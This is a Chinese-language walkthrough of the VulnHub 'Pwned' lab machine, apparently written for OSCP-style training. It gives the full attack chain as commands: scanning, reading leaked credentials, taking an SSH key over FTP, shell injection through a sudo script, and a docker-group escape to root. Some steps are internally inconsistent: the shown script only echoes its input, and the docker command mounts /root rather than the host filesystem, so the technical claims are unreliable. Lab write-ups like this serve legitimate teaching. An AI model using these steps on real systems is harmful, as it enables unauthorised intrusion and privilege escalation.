---
title: VulnHub Pwned 靶机完整渗透测试复现
description: 详细记录 VulnHub Pwned 靶机的完整渗透测试流程：从主机发现、端口扫描、Web 枚举、FTP 凭证复用、SSH 密钥登录获取初始立足点，到
  sudo 误配置提权至 selena 用户，再利用 Docker 组权限逃逸获取 Root 权限的全链路复现。适合 OSCP 风格实战练习与渗透测试基础巩固。
category: program-analysis
tags:
- VulnHub
- 渗透测试
- Web枚举
- FTP
- SSH密钥
- sudo提权
- Docker提权
- OSCP备考
- 靶机实战
date: '2023-04-16'
updated: '2026-11-14'
---
## 概览

本页面复现 VulnHub **Pwned** 靶机（难度：中等）的完整渗透测试攻击链。靶机地址：`https://www.vulnhub.com/entry/pwned-1,507/`，建议使用 VirtualBox 桥接模式部署。

攻击链核心路径：

1. **信息收集**：主机发现 → 端口扫描（21/FTP、22/SSH、80/HTTP）
2. **Web 枚举**：目录扫描 → `robots.txt` → `noting` 目录 → `hidden.txt` → 源码泄露 FTP 凭证
3. **凭证复用**：FTP 登录 → 下载 SSH 私钥 → SSH 登录 `ariana` 用户 → 获取 Flag1
4. **横向提权**：`sudo -l` 发现 `messenger.sh` 可以 `selena` 无密码执行 → 注入命令获取 `selena` Shell
5. **垂直提权**：`selena` 属于 `docker` 组 → 挂载宿主 `/root` 到容器 → 读取 Flag2（Root）

## 环境与工具

| 组件 | 说明 |
|------|------|
| 靶机 | VulnHub Pwned (IP: 10.0.2.4) |
| 攻击机 | Kali Linux / 任意 Linux |
| 主要工具 | `nmap`、`gobuster`/`dirb`、`ftp`、`ssh`、`sudo`、`docker` |
| 关键技术 | 目录枚举、源码审计、凭证复用、SSH 密钥认证、sudo 误配置利用、Docker 组逃逸 |

## 攻击复现

### 主机发现与端口扫描

```bash
# 主机发现（示例使用 netdiscover 或 arp-scan）
netdiscover -r 10.0.2.0/24

# 全端口扫描
nmap -sS -p- -T4 10.0.2.4
# 结果：21/tcp open  ftp
#       22/tcp open  ssh
#       80/tcp open  http

# 服务版本探测
nmap -sV -sC -p 21,22,80 10.0.2.4
```

> 交叉引用：[[vulnhub-platform-resource-index]] 中汇总了 VulnHub 平台介绍、750+ 镜像资源及现有 Writeup 索引。

### Web 服务枚举

#### 目录扫描

```bash
gobuster dir -u http://10.0.2.4 -w /usr/share/wordlists/dirb/common.txt -x txt,php,html
# 发现：/robots.txt
```

#### 关键路径探索

```bash
# robots.txt
curl http://10.0.2.4/robots.txt
# Disallow: /noting/

# /noting/ 目录下发现 hidden.txt
curl http://10.0.2.4/noting/hidden.txt
# 内容提示查看页面源码
```

#### 源码泄露凭证

访问 `http://10.0.2.4/noting/`，右键查看页面源码（或 `curl -s` 配合 `grep`），发现硬编码凭证：

```html
<!-- Username: ariana -->
<!-- Password: ******** -->
```

> 类似的 Web 枚举与敏感信息泄露模式可见 [[vulnhub-bbs-cute-102-writeup]]（CuteNews 文件上传绕过）、[[vulnhub-sar-writeup]]（sar2HTML RCE）、[[glasgowsmile-vulnhub-writeup]]（Joomla 爆破）。

### FTP 登录与 SSH 私钥获取

```bash
ftp 10.0.2.4
# Name: ariana
# Password: <从源码获取的密码>

ftp> ls
# 发现文件：id_rsa、note.txt

ftp> get id_rsa
ftp> get note.txt
ftp> bye
```

`note.txt` 确认用户名为 `ariana`。

#### SSH 密钥登录

```bash
chmod 600 id_rsa
ssh -i id_rsa ariana@10.0.2.4
# 成功登录
```

#### 获取 Flag1

```bash
cat /home/ariana/flag.txt
# 或 cat flag.txt（视实际路径而定）
```

> SSH 私钥复用模式同样出现于 [[vulnhub-infosecprep-oscp-writeup]]（WordPress 目录遍历获取 Base64 编码私钥）。

### 提权至 selena（sudo 误配置）

#### 枚举 sudo 权限

```bash
sudo -l
# 输出示例：
# User ariana may run the following commands on pwned:
#     (selena) NOPASSWD: /home/messenger.sh
```

#### 分析 messenger.sh

```bash
cat /home/messenger.sh
#!/bin/bash
read -p "Enter your message: " msg
echo $msg
# 关键点：msg 直接作为命令执行（无过滤）
```

#### 利用命令注入获取 selena Shell

```bash
sudo -u selena /home/messenger.sh
# 输入：/bin/bash
# 或使用 python 交互式 shell：
# 输入：python3 -c "import pty; pty.spawn('/bin/bash')"
```

成功获得 `selena` 用户交互式 Shell。

#### 信息收集（selena 视角）

```bash
id
# uid=1001(selena) gid=1001(selena) groups=1001(selena),999(docker)
# 关键发现：属于 docker 组

cat /home/selena/diary.txt
# 个人日记，暗示 ariana FTP 中 SSH 密钥的由来
```

> sudo 误配置提权是经典提权向量，[[vulnhub-sar-writeup]] 中也涉及计划任务配置不当写入 `/etc/passwd` 提权；[[0w1club-training-shellshock-cgi-exploitation]] 则演示了 Shellshock + Dirty COW 的完整提权链。

### Docker 组逃逸获取 Root

#### 验证 Docker 权限

```bash
docker images
# 列出本地镜像，任选一个（如 ubuntu:latest 或 alpine）
```

#### 挂载宿主根目录到容器

```bash
docker run -it -v /root:/mnt ubuntu chroot /mnt
# 解释：
#   -v /root:/mnt   将宿主 /root 挂载到容器 /mnt
#   chroot /mnt     切换根目录至挂载点，即宿主 /root
```

#### 读取 Root Flag

```bash
# 此时已在宿主 /root 环境下
ls
cat flag.txt
# 获取最终 Flag（Root）
```

> Docker 组提权属于容器安全经典误配置，原理为 `docker` 组用户拥有与 root 等效的 Docker daemon 访问权限。更多容器逃逸技术可见 [[d3ctf-2021-d3dev-qemu-escape-writeup]]（QEMU 虚拟机逃逸）。

## 关键知识点总结

| 阶段 | 技术点 | 关键命令/操作 |
|------|--------|---------------|
| 信息收集 | nmap 全端口+版本扫描 | `nmap -sS -sV -p-` |
| Web枚举 | 目录扫描、robots.txt、源码审计 | `gobuster`、`curl`、浏览器查看源码 |
| 凭证复用 | FTP 登录、下载 SSH 私钥 | `ftp`、`get`、`chmod 600` |
| 初始访问 | SSH 密钥认证 | `ssh -i id_rsa user@ip` |
| 横向移动 | sudo -l 枚举、脚本命令注入 | `sudo -u selena /home/messenger.sh` → 输入 `python3 -c "import pty; pty.spawn('/bin/bash')"` |
| 权限维持/提升 | Docker 组逃逸（挂载宿主根目录） | `docker run -it -v /root:/mnt ubuntu chroot /mnt` |

## 防御与缓解建议

1. **最小权限原则**：避免在 Web 源码/前端注释中硬编码凭证；FTP 与 SSH 账号密码/密钥应隔离，禁止跨服务复用。
2. **sudo 配置审计**：定期执行 `sudo -l` 审计；禁止 `NOPASSWD` 执行可写/可控脚本；若必须允许，脚本应使用绝对路径、校验输入、避免 `eval`/`bash -c` 等动态执行。
3. **Docker 组管控**：非必要不将普通用户加入 `docker` 组；生产环境建议使用 Rootless Docker 或 Podman；启用 Docker daemon 访问授权插件（如 `docker-authz`）。
4. **文件权限与完整性**：`messenger.sh` 应设为 `root:root` 且仅 `root` 可写；关键脚本纳入文件完整性监控（AIDE/Tripwire）。
5. **网络分段与监控**：靶机部署在隔离网段；生产环境部署 WAF、IDS/IPS、审计日志集中分析。

## 相关资源与延伸阅读

- [[vulnhub-platform-resource-index]] — VulnHub 平台介绍、镜像资源合集、现有 Writeup 索引
- [[vulnhub-doubletrouble-writeup]] — Shellshock (CVE-2014-6271) + Dirty COW (CVE-2016-5195) 完整攻击链
- [[vulnhub-sar-writeup]] — sar2HTML RCE + 计划任务/CVE-2021-3493 双提权路径
- [[vulnhub-bbs-cute-102-writeup]] — CuteNews 文件上传绕过 (GIF89a) + 反弹 Shell
- [[vulnhub-infosecprep-oscp-writeup]] — WordPress 目录遍历获取 Base64 SSH 私钥 + SUID bash 提权
- [[vulnhub-dawn2-writeup]] — Windows 缓冲区溢出 (Immunity Debugger + mona.py) + 双服务提权
- [[vulnhub-hard-socnet2-writeup]] — 高难度靶机：文件上传、SQLi、XML-RPC 暴破、CVE-2021-3493、二进制缓冲区溢出
- [[glasgowsmile-vulnhub-writeup]] — Joomla 爆破 + 多层编码 + 定时任务提权
- [[0w1club-training-shellshock-cgi-exploitation]] — 0w1Club 归档 Shellshock 实战培训记录
- [[peda-buffer-overflow-analysis-guide]] — PEDA 调试 Linux 缓冲区溢出全流程（含 ROP 链构造）
- [[rop-linux-x86-beginner-tutorial]] — Linux x86 ROP 入门教程（栈溢出、保护机制、偏移定位、Shellcode）

## 变更记录

| 日期 | 版本 | 说明 |
|------|------|------|
| 2023-04-16 | 1.0 | 初始版本，基于微信归档文章整理 |
| 2025-01-XX | 1.1 | 结构化重写，增加交叉引用、防御建议、知识点总结表 |

---
*本页面基于 0w1Club 微信公众号归档文章《VulnHub靶机 \| Pwned》整理，仅供安全研究与教学参考，请勿用于非授权渗透测试。*

## 来源

- [0x00实验室-202108-202304_026](../sources/0x00实验室-202108-202304_026.md)
